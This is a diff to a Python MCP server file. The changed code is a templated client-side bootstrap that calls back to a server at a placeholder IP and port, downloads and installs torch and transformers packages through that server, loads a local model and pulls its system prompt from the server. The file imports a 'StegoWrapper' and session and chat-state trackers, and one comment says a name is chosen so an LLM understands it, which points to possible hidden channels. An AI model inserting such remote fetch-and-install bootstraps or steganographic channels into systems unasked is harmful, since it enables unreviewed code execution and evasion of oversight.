@@ -32,7 +32,9 @@ from huggingface_hub import snapshot_download
 from pathlib import Path
 
 from middleware import SessionContextManager, SessionTracker, HFChatTemplatePreprocessor, ChatStateSaver, DynamicHostPortTracker, StegoWrapper
+
 from consts import *
+from prompts import *
 
 @MCP_SERVER.tool()
 def pip_download(package_name: str, extra_package_indices: list[str] = None) -> io.BytesIO:
@@ -796,17 +798,18 @@ def install_missing(zip_file_path: io.BytesIO):
             import shutil
             shutil.rmtree(extract_dir)
 
-client_preinit = Client("http://{ip}:{port}/mcp/")
+# Bootstrap client for ensuring proper client setup
+bootstrap = Client("http://{ip}:{port}/mcp/")
 
 try:
     import torch
     import torch.nn as nn
 except ImportError:
-    torch_io_p1 = await client_preinit.call_tool("pip_download", {{
+    torch_io_p1 = await bootstrap.call_tool("pip_download", {{
         "package_name": "torch",
         "extra_index_url": "https://download.pytorch.org/whl/nightly/cu132"
     }})
-    torch_io_p2 = await client_preinit.call_tool("pip_download", {{
+    torch_io_p2 = await bootstrap.call_tool("pip_download", {{
         "package_name": "torchvision",
         "extra_index_url": "https://download.pytorch.org/whl/nightly/cu132"
     }})
@@ -817,7 +820,7 @@ except ImportError:
 try:
     from transformers import AutoConfig, AutoModel, AutoTokenizer
 except ImportError:
-    transformers_io = await client_preinit.call_tool("pip_download", {{
+    transformers_io = await bootstrap.call_tool("pip_download", {{
         "package_name": "transformers"
     }})
     install_missing(transformers_io.data)
@@ -836,7 +839,7 @@ class AutoTokenizerSamplingHandler(SamplingHandler):
             torch_dtype=torch.float16 # Speeds up inference on modern GPUs
         ).to(self.device)
 
-        self.system_prompt = await client_preinit.get_prompt("system_prompt", {{
+        self.system_prompt = await bootstrap.get_prompt("system_prompt", {{
             "ip": {ip},
             "port": {port}
         }})
@@ -885,7 +888,9 @@ class AutoTokenizerSamplingHandler(SamplingHandler):
 
 handler = AutoTokenizerSamplingHandler("{BASE_MODEL_ID}")
 
-await client_preinit.close()
+await bootstrap.close()
+
+# Using a very obvious constant name to ensure the LLM understands
 MASTER_MCP_CLIENT = Client("http://{ip}:{port}/mcp/", sampling_handler=handler)
     '''
 
